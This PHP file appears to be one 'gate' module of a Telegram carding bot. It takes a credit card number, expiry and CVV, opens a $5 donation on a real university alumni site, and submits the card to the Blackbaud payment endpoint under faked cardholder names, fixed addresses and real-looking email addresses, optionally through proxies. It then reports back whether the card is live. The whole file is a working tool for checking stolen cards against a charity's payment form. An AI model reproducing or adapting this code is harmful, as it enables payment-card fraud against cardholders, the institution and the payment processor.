<?php 

use App\Faker\{Name, Internet, Address};
use App\Models\Bot;
use App\Gate\{CurlX, Make, Responses as Res};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];
# ~ REQ 1 ~ #
$headers0 = ['Host: alumni.nyls.edu'];
$site0 = ['url' => 'https://alumni.nyls.edu', 'method' => 'GET', 'post' => null, 'headers' => $headers0, 'cookie' => null, 'proxy' => null];
$req0 = Make::Create(1, $site0, $gate, $user);
IsUnspam($req0, $user);
$xtoken = CurlX::ParseString($req0->body, "this.bbtoken = '", "'");
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(1, implode('|', $cc), $gate['name'], $lang['wait']));


# ~ REQ 2 ~ #
$headers1 = ['Host: alumni.nyls.edu', 'Accept: */*', 'content-type: application/json', 'X-Requested-With: XMLHttpRequest', 'X-Token: '.$xtoken];
$post1 = '{"TokenId":"f660b54d-7b85-4ac3-a488-1bf9d4f86787","FinderNumber":"-1","Donation":{"Donor":{"Title":"Admiral","FirstName":"a","LastName":"r","MiddleName":"","Suffix1":"","Suffix2":"","EmailAddress":"lajanel1@alumno.uned.es","Phone":"15023851039","OrganizationName":null,"Address":{"StreetAddress":"NY Street 324","City":"New York","State":"NY","Country":"United States","PostalCode":"10001"},"BackOfficeID":"0","ContactConsents":[],"EmailGlobalOptOut":null,"MaidenName":"","SchoolName":null,"ClassOf":null,"Attributes":[]},"Gift":{"IsAnonymous":false,"FinderNumber":null,"SourceCode":null,"PaymentMethod":0,"Comments":"","Designations":[{"Amount":"5.00","DesignationId":null,"BackOfficeID":"273","Name":"NYLS Fund"}],"Recurrence":null,"Attributes":[],"Tribute":null,"IsCorporate":false,"CreditCardToken":null,"DirectDebit":null,"IsTruePledge":null,"TruePledgeInstallment":null,"MGCompany":null},"Origin":{"PageName":"Annual Gift - nyls.edu","PageID":920,"PartName":"Annual Gift Donation 2.0 Form","PartID":2346,"PartTypeID":158,"AppealID":0,"PageURL":"https://alumni.nyls.edu/sslpage.aspx?pid=920","AdminPartURL":"https://alumni.nyls.edu/cms/contenthome/id/2346?cid=2346","TransactionDate":"2022-05-10T23:00:58.3271148Z","RecordedByUserDisplayName":null,"RecordedByUserName":null,"RecordedByUserID":0,"TransactionVersion":"7.2.0.701","ClientSitesID":1,"TransactionCulture":null,"AppealBackOfficeId":"0"},"BBSPReturnUri":null,"MerchantAccountId":"a4acee0b-222a-4a9d-ae97-f006cebaf9aa","BBSPTemplateSitePageId":null},"ClientDonationId":"200","PageId":"920","UseCaptcha":false,"ConsentPartId":"0"}';
$site1 = ['url' => 'https://alumni.nyls.edu/WebApi/BBSP/BBSPReDirect', 'method' => 'POST', 'post' => $post1, 'headers' => $headers1, 'cookie' => null, 'proxy' => null];
$req1 = Make::Create(2, $site1, $gate, $user);
IsUnspam($req1, $user);
$fim0 = json_decode($req1->body, true);
$trans_id = CurlX::ParseString($fim0['Data'], 'https://payments.blackbaud.com/Pages/SecurePayment.aspx?t=', '"');
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(2, implode('|', $cc), $gate['name'], $lang['wait']));

$mes = array('01' => 1, '02' => 2, '03' => 3, '04' => 4, '05' => 5, '06' => 6, '07' => 7, '08' => 8, '09' => 9, '10' => 10, '11' => 11, '12' => 12);

# ~ REQ 3 ~ #
$headers2 = ['Host: payments.blackbaud.com', 'content-type: application/x-www-form-urlencoded; charset=UTF-8'];
$post2 = 'addr=Main+Street+353&city=Miami&postal=33001&phone=15023851039&email=castillovazquez193%40gmail.com&stateHidden=087cbd0b-3360-4b28-a4be-23c149323337&countryHidden=d74936d8-7394-4dc2-bba6-424ab5f053cc&csc='.$cc[3].'&cardholdername='.Name::firstName().'+'.Name::lastName().'&cardnumber='.$cc[0].'&expiry='.$mes[$cc[1]].'%2F'.$cc[2].'&issue=';
$site2 = ['url' => 'https://payments.blackbaud.com/WebMethods/PaymentServices.ashx?action=SubmitTrans&t='.$trans_id, 'method' => 'POST', 'post' => $post2, 'headers' => $headers2, 'cookie' => null, 'proxy' => $proxy2];
$req2 = Make::Create(3, $site2, $gate, $user);
IsUnspam($req2, $user);
$fim2 = json_decode($req2->body, true);
Res::SetParams($req2->body, $req1->body);
$res = Res::blackbaud_ch();
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));
